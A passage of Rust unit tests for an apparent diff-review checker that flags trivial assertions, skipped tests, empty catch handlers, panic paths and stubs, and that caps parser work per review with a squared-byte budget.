                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     )",
                ][..],
            ),
            (
                "tests/m.rs",
                &[
                    " fn check() {",
                    "     assert!(",
                    "         true,",
                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     );",
                ][..],
            ),
        ] {
            assert_eq!(found(&hunk_of(path, body)), [], "{body:?}");
        }
        // a stub that replaces what was there is added, on the added line
        let stub = found(&hunk_of(
            "src/m.rs",
            &[
                " fn f() -> u8 {",
                "     compute(",
                "-        1",
                "+        todo!()",
                "     )",
            ],
        ));
        assert_eq!(stub, [(S::StubAdded, Basis::SyntaxFragment, 4)]);
        // an unchanged construct beside an added line is still not evidence
        let beside = found(&hunk_of(
            "tests/m.rs",
            &[" fn checks() {", "     assert!(true);", "+    let a = 1;"],
        ));
        assert_eq!(beside, []);
        // a `catch` whose empty block is on the next line
        let catch = found(&hunk_of(
            "web/a.ts",
            &[
                " try { work(); }",
                "-catch (e) { report(e); }",
                "+catch",
                "+{ }",
            ],
        ));
        assert_eq!(catch, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        let bound = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{}"],
        ));
        assert_eq!(bound, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        // a block with something in it is not
        let handled = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{ report(e); }"],
        ));
        assert_eq!(handled, []);
    }

    /// Review V3 round 1, VD3-L-1: more spellings of the same things.
    #[test]
    fn other_spellings_of_a_skip_a_swallowed_rejection_and_a_panic_path_are_evidence() {
        let lexical = |signal| vec![(signal, Basis::Lexical, 2)];
        assert_eq!(
            found(&hunk_of(
                "web/a.test.ts",
                &["+test.skipIf(isCI)(\"adds\", () => {});"]
            )),
            lexical(S::TestSkipped)
        );
        // (the function form is the parser's own construct since review V3 round 9; inside
        // another macro's body, where the parser names nothing, the token rule finds it)
        for line in [
            "+let v = Result::unwrap(read());",
            "+let v = Option::expect(first(), \"one\");",
        ] {
            assert_eq!(
                found(&hunk_of("src/u.rs", &[line])),
                [(S::PanicPathAdded, Basis::SyntaxFragment, 2)],
                "{line}"
            );
            assert_eq!(
                found(&hunk_of(
                    "src/u.rs",
                    &[&format!("+outer! {{ {} }}", &line[1..])]
                )),
                lexical(S::PanicPathAdded),
                "{line}"
            );
        }
        for line in [
            "+run().catch(() => {});",
            "+p.catch(()=>{});",
            "+p.catch(e => {});",
            "+p.catch((e) => { });",
            "+p.catch(async (e) => {});",
            "+p.catch(function () {});",
            "+p.catch(function(e) { });",
            // review V3 round 2, VD3R2-L-1: a default value that calls a function
            "+run().catch((error = fallback()) => {});",
            "+run().catch(function (error = fallback()) {});",
            "+run().catch(async (error = fallback(a, (b))) => {});",
            "+run().catch(function onError(error) {});",
        ] {
            assert_eq!(
                found(&hunk_of("web/p.ts", &[line])),
                [(S::ErrorSwallowed, Basis::Hunk, 2)],
                "{line}"
            );
        }
        // a handler that does something, a named handler, and other calls named catch are not
        for line in [
            "+p.catch((e) => { report(e); });",
            "+p.catch(report);",
            "+p.catch(() => report());",
            "+p.catch(() => ({}));",
            "+cache.catchUp(() => {});",
            "+p.catch();",
            "+p.catch((error = fallback() => {});",
            "+p.catch((error = fallback()) => { report(error); });",
        ] {
            assert_eq!(found(&hunk_of("web/p.ts", &[line])), [], "{line}");
        }
        // a conditional skip is still reported: under some configuration the test does not run
        assert_eq!(
            found(&hunk_of(
                "tests/t.rs",
                &["+#[cfg_attr(miri, ignore)]", "+#[test]", "+fn a() {}"]
            ))
            .iter()
            .map(|i| i.0)
            .collect::<Vec<_>>(),
            [S::TestSkipped]
        );
    }
    /// Review V3 round 2, VD3R2-H-2: the parser reads at most a budget of hunks per review, in
    /// the review's order, and what lies beyond keeps the token rules' answer. Since the
    /// second independent review (IR2-H-5) a hunk is charged the square of its bytes, so
    /// hunks of 12 KB end the budget after three.
    #[test]
    fn the_parser_reads_a_review_only_up_to_its_budget() {
        // each hunk: one added line of about 12 KB, then an added panic path
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        let files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler, "+    y.unwrap();"]))
            .collect();
        let plan = FragmentPlan::of(&files);
        let parsed = (0..files.len()).filter(|n| plan.allows(*n, 0)).count();
        // the new side: the unchanged line `x`, the filler and the call, each with its line
        // end (a line's `+` stands for it here); the old side: the unchanged line
        let new = "x\n".len() + filler.len() + "+    y.unwrap();".len();
        let old = "x\n".len();
        let cost = fragment_cost(&files[0].patch_twin.hunks[0]).unwrap();
        assert_eq!(
            cost,
            FragmentCost {
                bytes: new + old,
                squares: u64::try_from(new * new + old * old).unwrap()
            }
        );
        assert_eq!(
            u64::try_from(parsed).unwrap(),
            REVIEW_SQUARE_BUDGET / cost.squares,
            "cost {cost:?}"
        );
        assert_eq!(parsed, 3);
        assert!(parsed * cost.bytes < REVIEW_FRAGMENT_BUDGET / 2);
        // the allowed hunks are the first ones, and an index the plan lacks is not parsed
        assert!((0..parsed).all(|n| plan.allows(n, 0)));
        assert!((parsed..files.len()).all(|n| !plan.allows(n, 0)));
        assert!(!plan.allows(0, 1) && !plan.allows(files.len(), 0));
        assert_eq!(plan.file(files.len()), &[] as &[Reading]);
        // inside the budget the parser confirms the item; beyond it the spelling stands
        let basis = |n: usize| {
            file_evidence_in(&files[n], plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis))
                .collect::<Vec<_>>()
        };
        assert_eq!(basis(0), [(S::PanicPathAdded, Basis::SyntaxFragment)]);
        assert_eq!(
            basis(files.len() - 1),
            [
                (S::PanicPathAdded, Basis::Lexical),
                (S::SyntaxUnchecked, Basis::Lexical)
            ]
        );
        // a file planned on its own is inside its own budget
        assert_eq!(
            file_evidence(&files[files.len() - 1])[0].basis,
            Basis::SyntaxFragment
        );
        // only Rust hunks with an added line that holds a word the parser reads cost anything
        let other = [
            hunk_of("a.py", &[&filler]),
            hunk_of("src/removed.rs", &["-    y.unwrap();"]),
            hunk_of("src/plain.rs", &[&filler]),
        ];
        let plan = FragmentPlan::of(&other);
        assert!((0..other.len()).all(|n| !plan.allows(n, 0)));
        assert!(other.iter().all(|file| found(file).is_empty()));
        // a word on an unchanged line counts: a construct can open there and reach an added line
        let context = [hunk_of(
            "src/context.rs",
            &["     assert!(", "+        true", "     );"],
        )];
        assert!(FragmentPlan::of(&context).allows(0, 0));
    }

    /// A new Rust file whose one hunk is `bytes` bytes on its new side and holds a word the
    /// parser reads (in a comment: it costs the parser nothing but the reading).
    fn sized(path: &str, bytes: usize) -> ReviewFile {
        let head = "// unwrap ";
        let line = format!("{head}{}", "a".repeat(bytes - head.len() - 1));
        let file = new_file(path, &[&line]);
        assert_eq!(
            fragment_cost(&file.patch_twin.hunks[0]).map(|cost| cost.bytes),
            Some(bytes)
        );
        file
    }

    /// Second independent review, IR2-H-5. For some text the parser's time grows with the
    /// square of the length (`// todo`, a newline, `#!#!#!…`: 16 KiB a second, 64 KiB fifteen),
    /// so the 256 KiB of bytes a review had bought sixteen hunks of 16 KB and 15 s, and one
    /// hunk of 64 KiB as long. Each parsed hunk is now charged the square of its bytes
    /// against the square of 22 KiB, and the plan stops there.
    #[test]
    fn the_plan_stops_at_the_square_budget() {
        const KIB: usize = 1024;
        assert_eq!(REVIEW_SQUARE_BUDGET, (22 * 1024) * (22 * 1024));
        assert_eq!(REVIEW_FRAGMENT_BUDGET, 128 * KIB);
        let readings = |sizes: &[usize]| -> Vec<bool> {
            let files: Vec<ReviewFile> = sizes
                .iter()
                .enumerate()
                .map(|(n, bytes)| sized(&format!("src/s{n}.rs"), *bytes))
                .collect();
            let plan = FragmentPlan::of(&files);
            (0..files.len()).map(|n| plan.allows(n, 0)).collect()
        };
        // one hunk of exactly 22 KiB spends the budget whole; a byte more is never parsed
        assert_eq!(readings(&[22 * KIB, 16]), [true, false]);
        assert_eq!(readings(&[22 * KIB + 1]), [false]);
        // the reviewer's patches: sixteen hunks of 16 KB (one is read), one and four of 64 KB
        // (none is), thirty-two of 8 KB (seven are)
        let read = |sizes: &[usize]| readings(sizes).iter().filter(|read| **read).count();
        assert_eq!(read(&[16_000; 16]), 1);
        assert_eq!(read(&[64_000; 4]), 0);
        assert_eq!(read(&[8_000; 32]), 7);
        // a hunk that does not fit costs nothing, and a smaller one after it may still fit
        assert_eq!(
            readings(&[16 * KIB, 16 * KIB, KIB, 16 * KIB, 14 * KIB]),
            [true, false, true, false, true]
        );
        // a hunk the plan turned away says that the parser did not read it
        let files = [sized("src/a.rs", 16_000), sized("src/b.rs", 16_000)];
        let plan = FragmentPlan::of(&files);
        let items = |n: usize| {
            file_evidence_in(&files[n], plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect::<Vec<_>>()
        };
        assert_eq!(items(0), []);
        assert_eq!(items(1), [(S::SyntaxUnchecked, Basis::Lexical, 1)]);
        // the old side is charged too, by its square: a small change under a large removal
        let removed = format!("-// {}", "a".repeat(16_000));
        let both = [
            hunk_of("src/c.rs", &[&removed, "+    y.unwrap();"]),
            hunk_of("src/d.rs", &[&removed, "+    y.unwrap();"]),
        ];
        let plan = FragmentPlan::of(&both);
        assert!(plan.allows(0, 0) && !plan.allows(1, 0));
    }

    /// The other side of the square budget: real reviews are many small hunks, and those all
    /// fit. A hundred hunks of 1 KiB spend a fifth of the square budget; what ends a review of
    /// such hunks is the byte budget, at 128 KiB.
    #[test]
    fn many_small_hunks_all_fit() {
        const KIB: usize = 1024;
        let small = |count: usize| -> Vec<ReviewFile> {
            (0..count)
                .map(|n| sized(&format!("src/s{n}.rs"), KIB))
                .collect()
        };
        let hundred = small(100);
        let plan = FragmentPlan::of(&hundred);
        assert!((0..hundred.len()).all(|n| plan.allows(n, 0)));
        assert!(u64::try_from(100 * KIB * KIB * 4).unwrap() < REVIEW_SQUARE_BUDGET);
        // the byte budget: exactly 128 of them fit, and the 129th does not
        let many = small(140);
        let plan = FragmentPlan::of(&many);
        let read: Vec<bool> = (0..many.len()).map(|n| plan.allows(n, 0)).collect();
        assert!(read[..128].iter().all(|read| *read));
        assert!(read[128..].iter().all(|read| !*read));
        // and a review of typical size, forty hunks of 2 KiB with a panic path in each, is
        // read whole by the parser
        let filler = format!("+    let x = {};", "1 + ".repeat(500) + "1");
        let typical: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/t{n}.rs"), &[&filler, "+    y.unwrap();"]))
            .collect();
        let plan = FragmentPlan::of(&typical);
        for (n, file) in typical.iter().enumerate() {
            let items: Vec<(EvidenceSignal, Basis)> = file_evidence_in(file, plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis))
                .collect();
            assert_eq!(items, [(S::PanicPathAdded, Basis::SyntaxFragment)], "{n}");
        }
    }

    /// A hunk with very many items is read in one pass. The parser's answer used to be merged
    /// by searching the items for each construct and then sorting them with a key that searched
    /// the hunk: a hunk of 300,000 such lines did not finish in 30 seconds. With that code this
    /// test does not finish either.
    #[test]
    fn a_hunk_with_very_many_items_is_read_in_one_pass() {
        const LINES: usize = 150_000;
        // not parsed (over the fragment budget): every line is an item, and the hunk says once
        // that the parser did not read it
        let added = vec!["+    y.unwrap();"; LINES];
        let matches = |file: &ReviewFile| {
            let kind = FileKind::of(file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            hunk_matches(
                &file.patch_twin.hunks[0],
                kind.language,
                &rules,
                Reading::Hunk,
            )
            .items
        };
        let items = matches(&hunk_of("src/a.rs", &added));
        assert_eq!(items.len(), LINES + 1);
        assert_eq!(
            &items[..3],
            [
                (Side::New, S::PanicPathAdded, 2, Basis::Lexical),
                (Side::New, S::SyntaxUnchecked, 2, Basis::Lexical),
                (Side::New, S::PanicPathAdded, 3, Basis::Lexical),
            ]
        );
        assert!(items.windows(2).all(|pair| pair[0].2 <= pair[1].2));
        // parsed (the new side is small), with as many items on the old side
        let mut removed = vec!["-#[test]"; LINES];
        removed.push("+    y.unwrap();");
        let items = matches(&hunk_of("tests/a.rs", &removed));
        assert_eq!(items.len(), LINES + 1);
        assert_eq!(items[0], (Side::Old, S::TestRemoved, 2, Basis::Lexical));
        assert_eq!(
            items[LINES],
            (Side::New, S::PanicPathAdded, 2, Basis::SyntaxFragment)
        );
    }

    /// Review V3 round 3, VD3R3-M-1: the old side is compared construct by construct, by line
    /// and column, and an old side that cannot be read suppresses nothing. Before, another
    /// trivial assertion on the same line, or an old side over the fragment budget, hid an
    /// assertion that the change made trivial.
    #[test]
    fn the_old_side_hides_only_the_same_construct_and_only_when_it_is_read() {
        let same_row = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true); assert!(",
                "-        computes()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(same_row, [(S::TrivialAssert, Basis::SyntaxFragment, 4)]);
        // the first of the two already was trivial and only its message changes: still nothing
        let first = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true,",
                "-        \"old\"",
                "+        \"new\"",
                "     ); assert!(computes());",
            ],
        ));
        assert_eq!(first, []);
        // An old side over the fragment budget is not parsed, and suppresses nothing. (Under
        // a review's plan such a hunk is no longer parsed at all, since its old side is
        // charged by its square, so the parser is asked for it directly here.)
        let long = format!("-        {}", "1 + ".repeat(17_000) + "1 > 0");
        let file = hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(",
                long.as_str(),
                "+        true",
                "     );",
            ],
        );
        let kind = FileKind::of(&file);
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            hunk_matches(hunk, kind.language, &rules, Reading::Hunk).items,
            [(Side::New, S::TrivialAssert, 4, Basis::SyntaxFragment)]
        );
        // under the plan it says that it was not read
        assert!(!FragmentPlan::of(std::slice::from_ref(&file)).allows(0, 0));
        assert_eq!(found(&file), [(S::SyntaxUnchecked, Basis::Lexical, 4)]);
    }

    /// Review V3 round 3, VD3R3-H-2. Whoever orders the hunks of a review must not be able to
    /// switch the parser off for a later one without a trace. Hunks with nothing for the parser
    /// cost nothing, so harmless filler spends no budget; and when the budget is spent on hunks
    /// that do hold its words, a later hunk whose construct only the parser finds says that it
    /// was not checked. Before, that hunk gave no evidence at all.
    #[test]
    fn a_hunk_the_parser_did_not_read_says_so() {
        // only the parser finds this one: the assertion is over three lines
        let hidden: &[&str] = &["+    assert!(", "+        true", "+    );"];
        let filler = format!("+    let x = {};", "1 + ".repeat(15_000) + "1");
        // Vesper's reproduction: 40 harmless hunks of about 60 KB, then the construct
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler]))
            .collect();
        files.push(hunk_of("tests/last.rs", hidden));
        let plan = FragmentPlan::of(&files);
        let last = files.len() - 1;
        assert!(plan.allows(last, 0), "harmless hunks spent the budget");
        let items = |plan: &FragmentPlan, n: usize| {
            file_evidence_in(&files[n], plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            items(&plan, last),
            [(S::TrivialAssert, Basis::SyntaxFragment, 2)]
        );
        // the same with filler that does hold a word the parser reads: hunks of about 12 KB,
        // of which the square budget takes three
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        let costly = format!("{filler} // unwrap");
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&costly]))
            .collect();
        // (a hunk as large as the others: a small one would still fit what is left)
        files.push(hunk_of(
            "tests/last.rs",
            &[&filler, "+    assert!(", "+        true", "+    );"],
        ));
        let plan = FragmentPlan::of(&files);
        assert!(!plan.allows(last, 0));
        let items = |n: usize| {
            file_evidence_in(&files[n], plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect::<Vec<_>>()
        };
        assert_eq!(items(last), [(S::SyntaxUnchecked, Basis::Lexical, 3)]);
        // a hunk the parser read gives no such item, and neither does one in another language
        assert_eq!(items(0), []);
        assert_eq!(found(&hunk_of("a.py", &["+x = 1  # unwrap"])), []);
        // the item is on the first added line that holds one of the words
        let later = hunk_of(
            "src/big.rs",
            &[
                "+    let a = 1;",
                &format!("+    let b = {};", "1 + ".repeat(17_000) + "1"),
                "+    todo ! ( );",
            ],
        );
        assert_eq!(
            found(&later),
            [
                (S::StubAdded, Basis::Lexical, 4),
                (S::SyntaxUnchecked, Basis::Lexical, 4)
            ]
        );
    }

    /// Review V3 round 3, VD3R3-H-2: spellings the parser reads are found by the token rules
    /// too, whatever their spacing, so that switching the parser off loses as little as can be.
    #[test]
    fn spaced_spellings_are_found_without_the_parser() {
        // each line is made too long for the parser by a comment, so only token rules read it
        let pad = "a".repeat(70_000);
        for (line, signal) in [
            ("value.unwrap ();", S::PanicPathAdded),
            ("value . expect (\"set\");", S::PanicPathAdded),
            ("assert!( true );", S::TrivialAssert),
            ("assert ! (true , \"always\");", S::TrivialAssert),
            ("debug_assert!( true );", S::TrivialAssert),
            ("assert_eq!( true , true );", S::TrivialAssert),
            ("todo ! ();", S::StubAdded),
            ("unimplemented !( \"later\" )", S::StubAdded),
            ("# [ ignore ]", S::TestSkipped),
            ("#[ignore = \"slow\"]", S::TestSkipped),
            ("#[ cfg_attr( miri , ignore ) ]", S::TestSkipped),
        ] {
            let text = format!("+    {line} // {pad}");
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[text.as_str()])),
                [
                    (signal, Basis::Lexical, 2),
                    (S::SyntaxUnchecked, Basis::Lexical, 2)
                ],
                "{line}"
            );
        }
        for line in [
            "my_assert!( true );",
            "x.assert!(true);",
            "assert!( true_enough() );",
            "assert!( true == x );",
            "retodo ! ();",
            "x.unwrap_or ();",
            "unwrap ();",
            "#[cfg_attr(miri, allow(ignore_me))]",
        ] {
            let text = format!("+    {line} // {pad}");
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[text.as_str()])),
                [(S::SyntaxUnchecked, Basis::Lexical, 2)],
                "{line}"
            );
        }
        assert!(trivial_assert_rust("assert\t! ( true )"));
        assert!(trivial_assert_rust("debug_assert_eq ! (true,true , \"m\")"));
        // the word itself is not split, a cut argument list does not match, and neither does
        // another macro that only begins or ends the same way
        for line in [
            "ass ert!(true)",
            "assert!(tru",
            "assert!(true",
            "assert_ne!(true, true)",
            "assert_eq!(true)",
            "assert!(true, true_enough)",
        ] {
            let trivial = line.starts_with("assert!(true, ");
            assert_eq!(trivial_assert_rust(line), trivial, "{line}");
        }
        assert!(ignore_rust("#[ignore]") && ignore_rust("# [ ignore = \"slow\" ]"));
        assert!(ignore_rust("#[cfg_attr(miri, ignore = \"slow\")]"));
        assert!(!ignore_rust("#[ignored]") && !ignore_rust("x#[ignore]"));
        assert!(!ignore_rust("#[cfg_attr(miri, ignored)]") && !ignore_rust("[ignore]"));
        assert!(!spaced("", &["todo"], &["!("]) && !spaced("todo!(", &[], &["!("]));
        assert_eq!(follows(b"", b""), Some(0));
        assert_eq!(
            (follows(b"  ", b"!"), follows(b" ! (", b"!(")),
            (None, Some(4))
        );
    }

    /// A hunk over the fragment budget is turned away before anything is built from it.
    #[test]
    fn a_hunk_over_the_fragment_budget_costs_nothing_and_keeps_the_spelling() {
        let braces = format!(
            "+{}",
            "}".repeat(deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET)
        );
        let file = hunk_of("src/big.rs", &[&braces, "+    y.unwrap();"]);
        assert_eq!(fragment_cost(&file.patch_twin.hunks[0]), None);
        assert!(!FragmentPlan::of(std::slice::from_ref(&file)).allows(0, 0));
        assert_eq!(
            found(&file),
            [
                (S::PanicPathAdded, Basis::Lexical, 3),
                (S::SyntaxUnchecked, Basis::Lexical, 3)
            ]
        );
    }
}
